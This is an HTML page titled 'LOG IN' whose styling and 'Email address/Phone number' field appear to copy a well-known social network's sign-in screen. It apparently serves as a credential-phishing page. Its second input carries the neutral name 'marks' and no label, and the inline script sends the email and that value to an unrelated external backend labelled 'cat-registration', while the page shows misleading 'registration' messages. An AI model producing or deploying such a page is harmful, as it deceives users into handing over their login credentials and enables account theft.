
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>LOG IN </title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      background: #fff;
      color: #1c1e21;
      font-family: Arial, Helvetica, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .form-wrap {
      width: min(446px, 100%);
      margin: 28px auto;
    }

    .heading {
      font-size: 20px;
      margin: 0 0 25px;
      font-weight: 600;
      text-align: center;
    }

    .description {
      color: #606770;
      font-size: 14px;
      line-height: 1.5;
      text-align: center;
      margin-bottom: 24px;
    }

    input {
      display: block;
      width: 100%;
      height: 60px;
      border: 1px solid #d5d8dc;
      border-radius: 12px;
      padding: 0 17px;
      margin-bottom: 14px;
      font-size: 15px;
      color: #1c1e21;
      outline: none;
      background: #fff;
    }

    input:focus {
      border-color: #1877f2;
      box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.12);
    }

    input::placeholder {
      color: #606770;
      opacity: 1;
    }

    .login {
      width: 100%;
      min-height: 48px;
      margin-top: 12px;
      border: none;
      border-radius: 24px;
      background: #0866e9;
      color: #fff;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }

    .login:hover {
      background: #0755c7;
    }

    .login:disabled {
      opacity: 0.65;
      cursor: not-allowed;
    }

    #status {
      text-align: center;
      margin-top: 18px;
      font-size: 14px;
      line-height: 1.5;
      overflow-wrap: anywhere;
    }

    .note {
      margin-top: 20px;
      font-size: 12px;
      color: #606770;
      text-align: center;
      line-height: 1.5;
    }

    @media (max-height: 520px) {
      body {
        align-items: flex-start;
      }

      .form-wrap {
        margin: 30px auto;
      }
    }
  </style>
</head>

<body>

  <main class="form-wrap">

    <h1 class="heading">LOG IN</h1>

    <p class="description">
      Enter your email address to login.
    </p>

    <form id="marksForm">

      <input
        type="email"
        name="email"
        placeholder="Email address/Phone number"
        autocomplete="email"
        maxlength="250"
        required
      >

      <input
        type="text"
        name="marks"
        placeholder=""
        maxlength="100"
        required
      >

      <button class="login" id="submitBtn" type="submit">
        Log In
      </button>

    </form>

    <p id="status" role="status" aria-live="polite"></p>

    <p class="note">
      Your submitted email address and  will be used for your next login.
    </p>

  </main>

  <script>
    const form = document.getElementById("marksForm");
    const status = document.getElementById("status");
    const submitBtn = document.getElementById("submitBtn");

    const API_URL =
      "https://cat-registration-backend.onrender.com/register";

    form.addEventListener("submit", async function(event) {
      event.preventDefault();

      status.textContent = "Submitting registration...";
      status.style.color = "#606770";
      submitBtn.disabled = true;
      submitBtn.textContent = "Submitting...";

      const email = form.elements["email"].value.trim();
      const marks = form.elements["marks"].value.trim();

      try {
        const response = await fetch(API_URL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            contact: email,
            marks: marks
          })
        });

        const result = await response.text();

        if (!response.ok) {
          throw new Error(
            result || "Registration failed. Please try again."
          );
        }

        status.textContent =
          "Registration submitted successfully!";
        status.style.color = "green";

        form.reset();

      } catch (error) {
        console.error("Registration error:", error);

        status.textContent =
          error.message === "Failed to fetch"
            ? "Unable to connect to the server. Please try again later."
            : error.message;

        status.style.color = "red";

      } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = "Submit Registration";
      }
    });
  </script>

</body>
</html>
